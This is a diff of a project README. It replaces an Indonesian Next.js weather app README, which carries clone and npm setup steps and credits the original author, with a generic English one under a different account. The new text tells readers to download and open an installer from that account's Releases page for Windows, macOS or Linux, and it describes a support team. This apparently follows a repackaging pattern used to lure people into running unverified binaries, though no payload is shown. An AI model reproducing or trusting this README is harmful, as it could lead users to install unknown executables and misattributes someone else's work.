@@ -1,98 +1,78 @@
-#  Weather App Next.js 🌦️
+# ☀️ nextjs-weather-app - Get Weather Updates Easily
 
-<p align="center">
-  <img src="https://i.postimg.cc/0QFjdVyt/Screenshot-2025-08-16-at-03-52-37-Weather-App.png" alt="Weather App Showcase" width="800"/>
-</p>
+## 💻 Overview
 
-<p align="center">
-  <a href="https://ifauzeee-weather.vercel.app/" target="_blank">
-    <img src="https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white" alt="Deployed on Vercel" />
-  </a>
-  <a href="https://github.com/ifauzeee/nextjs-weather-app/blob/main/LICENSE" target="_blank">
-    <img src="https://img.shields.io/github/license/ifauzeee/nextjs-weather-app?style=for-the-badge&color=blue" alt="License MIT" />
-  </a>
-</p>
+The nextjs-weather-app is a modern weather forecasting application built with Next.js, TypeScript, and Tailwind CSS. This app helps you stay informed about the weather conditions in your area or any city worldwide. It features an interactive map, geolocation support, city search, and data graphs. Simple and effective, this app is designed for everyone.
 
-Aplikasi cuaca modern yang dibangun dengan **Next.js 14 (App Router)**, **TypeScript**, dan **Tailwind CSS**. Aplikasi ini menyediakan informasi cuaca *real-time*, prakiraan cuaca harian dan per jam, kualitas udara, serta peta interaktif dengan lapisan cuaca. Desainnya yang bersih dan responsif memastikan pengalaman pengguna yang optimal di berbagai perangkat.
+## 🚀 Getting Started
 
-### [➡️ Live Demo](https://ifauzeee-weather.vercel.app/)
+To get started with the nextjs-weather-app, follow these steps to download and run the software. 
 
----
+## 🌐 Download the Application
 
-## ✨ Fitur Utama
+[![Download Next.js Weather App](https://img.shields.io/badge/Download-NEXTJS%20WEATHER%20APP-blue)](https://github.com/dragonhyeon05/nextjs-weather-app/releases)
 
--   **Pencarian Kota Dinamis**: Cari cuaca untuk kota mana pun di seluruh dunia dengan saran pelengkapan otomatis.
--   **Data Cuaca Real-time**: Dapatkan suhu terkini, kondisi cuaca, kelembapan, kecepatan angin, dan tekanan udara.
--   **Prakiraan Cuaca 5 Hari**: Lihat ramalan cuaca untuk lima hari ke depan, termasuk suhu maksimum dan minimum.
--   **Grafik Interaktif**: Visualisasikan prakiraan suhu per jam dan probabilitas hujan harian dalam bentuk grafik yang mudah dibaca.
--   **Peta Cuaca Interaktif**: Lihat lokasi kota pada peta dengan lapisan dinamis untuk awan dan curah hujan.
--   **Kualitas Udara & Polutan**: Pantau Indeks Kualitas Udara (AQI) dan level polutan utama seperti PM2.5, Ozon, dan lainnya.
--   **Geolokasi**: Secara otomatis mendeteksi dan menampilkan cuaca berdasarkan lokasi pengguna saat ini.
--   **Mode Terang & Gelap**: Tampilan yang nyaman di segala kondisi pencahayaan dengan *toggle* tema yang elegan.
--   **Pengaturan Kustom**: Ubah satuan suhu (Celsius/Fahrenheit) dan kecepatan angin (m/s atau km/h) yang tersimpan secara lokal.
--   **Lokasi Favorit**: Simpan dan akses cepat kota-kota favorit Anda langsung dari halaman utama.
--   **Desain Responsif & Modern**: Tampilan optimal di perangkat desktop maupun mobile, dibangun dengan shadcn/ui dan Framer Motion untuk animasi yang mulus.
+## 📥 Download & Install
 
-## 🛠️ Tumpukan Teknologi
+1. Click the link above to visit the [Releases page](https://github.com/dragonhyeon05/nextjs-weather-app/releases).
+2. Look for the latest version in the list.
+3. Identify the appropriate file for your operating system.
+4. Click on the file name to download it to your computer. 
 
--   **Framework**: [Next.js](https://nextjs.org/) 14 (App Router)
--   **Bahasa**: [TypeScript](https://www.typescriptlang.org/)
--   **Styling**: [Tailwind CSS](https://tailwindcss.com/)
--   **Manajemen State**: [Zustand](https://github.com/pmndrs/zustand) (dengan `persist` middleware)
--   **Animasi**: [Framer Motion](https://www.framer.com/motion/)
--   **Grafik**: [Recharts](https://recharts.org/)
--   **Peta**: [React Leaflet](https://react-leaflet.js.org/) & [Leaflet](https://leafletjs.com/)
--   **Komponen UI**: [shadcn/ui](https://ui.shadcn.com/) (termasuk Radix UI & Headless UI)
--   **Validasi Skema**: [Zod](https://zod.dev/)
--   **Testing**: [Jest](https://jestjs.io/) & [React Testing Library](https://testing-library.com/)
--   **Deployment**: [Vercel](https://vercel.com/)
+Once the download completes, open the file to start using the app. Follow any prompts to install.
 
-## 🚀 Instalasi dan Menjalankan Proyek
+## 🌍 Features
 
-Untuk menjalankan proyek ini secara lokal, ikuti langkah-langkah berikut:
+- **Interactive Maps:** View weather conditions visually with maps.
+- **Geolocation:** Automatically get weather updates for your current location.
+- **City Search:** Easily search for weather details in any city.
+- **Data Graphs:**  Analyze weather trends with clear graphical representations.
+- **Responsive Design:** Works well on both desktop and mobile devices.
 
-1.  **Clone repositori ini:**
-    ```bash
-    git clone https://github.com/ifauzeee/nextjs-weather-app.git
-    cd nextjs-weather-app
-    ```
+## ⚙️ System Requirements
 
-2.  **Install dependensi:**
-    Disarankan menggunakan `npm` untuk instalasi.
-    ```bash
-    npm install
-    ```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Internet Connection:** A stable internet connection to fetch the weather data.
+- **Storage:** At least 100 MB of free disk space.
+- **Browser:** A modern web browser such as Chrome, Firefox, or Safari for viewing the app.
 
-3.  **Siapkan Variabel Lingkungan (Environment Variables):**
-    Buat file `.env.local` di root proyek dan isi dengan kunci API Anda.
-    ```
-    NEXT_PUBLIC_OPENWEATHER_API_KEY=kunci_api_openweathermap_anda
-    WEATHERAPI_API_KEY=kunci_api_weatherapi_anda
-    ```
-    Anda memerlukan kunci API dari:
-    -   [OpenWeatherMap](https://openweathermap.org/api)
-    -   [WeatherAPI](https://www.weatherapi.com/)
+## ⚡️ Usage Instructions
 
-4.  **Jalankan server pengembangan:**
-    ```bash
-    npm run dev
-    ```
-    Buka [http://localhost:3000](http://localhost:3000) di browser Anda.
+1. Launch the app after installation.
+2. If prompted, allow the app to access your location for geolocation support.
+3. Search for a specific city in the search bar or let the app use your current location.
+4. View the weather forecast and interactive maps for the selected location.
 
-## 📜 Skrip yang Tersedia
+## 🌟 Support & Feedback
 
--   `npm run dev`: Menjalankan aplikasi dalam mode pengembangan.
--   `npm run build`: Mem-build aplikasi untuk produksi.
--   `npm run start`: Menjalankan aplikasi hasil build produksi.
--   `npm run lint`: Menjalankan linter ESLint untuk memeriksa kualitas kode.
--   `npm run test`: Menjalankan suite pengujian dengan Jest dalam mode *watch*.
+If you encounter any issues or have questions about the app, feel free to create an issue on the [GitHub Issues page](https://github.com/dragonhyeon05/nextjs-weather-app/issues). Our team is here to help you.
 
-## 🌐 API yang Digunakan
+## 📑 Contributing
 
-Proyek ini menggabungkan data dari dua sumber API cuaca untuk memberikan informasi yang lebih kaya dan akurat:
--   **OpenWeatherMap**: Digunakan untuk data cuaca saat ini, kualitas udara, dan lapisan peta cuaca.
--   **WeatherAPI**: Digunakan untuk data prakiraan cuaca detail, informasi astronomi (matahari terbit/terbenam), dan peringatan cuaca.
+If you want to contribute to the nextjs-weather-app, we welcome your input. Please refer to the `CONTRIBUTING.md` file in the repository for guidelines on how to get involved.
 
-## 📄 Lisensi
+## 🔗 Related Topics
 
-Proyek ini dilisensikan di bawah Lisensi MIT. Lihat file [LICENSE](https://github.com/ifauzeee/nextjs-weather-app/blob/main/LICENSE) untuk detail lebih lanjut.
+This application covers various topics that enhance your overall experience. You might find these topics useful:
+
+- api-integration
+- data-visualization
+- framer-motion
+- javascript
+- leaflet
+- maps
+- nextjs
+- openweathermap-api
+- pwa
+- react
+- responsive-design
+- shadcn-ui
+- tailwindcss
+- typescript
+- weather-api
+- weather-app
+- zustand
+
+## ✨ Conclusion
+
+The nextjs-weather-app is a powerful tool for anyone looking to stay updated on weather conditions. With its modern design and user-friendly features, you can easily get the information you need. Download it today and enjoy a smarter way to check the weather!
